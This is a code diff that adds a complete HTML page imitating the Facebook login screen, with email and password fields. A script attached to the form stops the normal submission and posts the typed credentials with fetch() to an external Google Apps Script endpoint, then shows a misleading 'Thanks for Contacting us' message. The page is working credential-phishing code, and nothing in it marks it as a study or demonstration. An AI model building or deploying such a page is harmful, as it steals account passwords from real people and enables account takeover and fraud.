@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="index.css">
+    <link rel="icon" href="fb icon.png" type="png">
+</head>
+<body>
+    <div class="continor">
+        
+            <form class="mainbox" action="" method="post" name="google-sheet">
+            <input type="text" name="email" placeholder="Email or Phone Number">
+            <input type="password" name="password" placeholder="Password">
+            <button class="login" name="submit"><a href="/">Login</a></button>
+            <a class="forgot" href="/">Forgot password?</a>
+            <div class="line"></div>
+            <button class="create"><a href="/">Create New Account</a></button></form>
+            
+        
+        <div class="maintext"><h1>Facebook</h1><p>Contact youre friends and the world around your on facebook.</p></div>
+
+    </div>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwF8Ggp-m8XjhqF0RzU6hqsF274RsHIIE9CrnKdCK4v1B61zw2pmUx1duJpuU_5DFY2/exec'
+        const form = document.forms['google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+
+</body>
+</html>
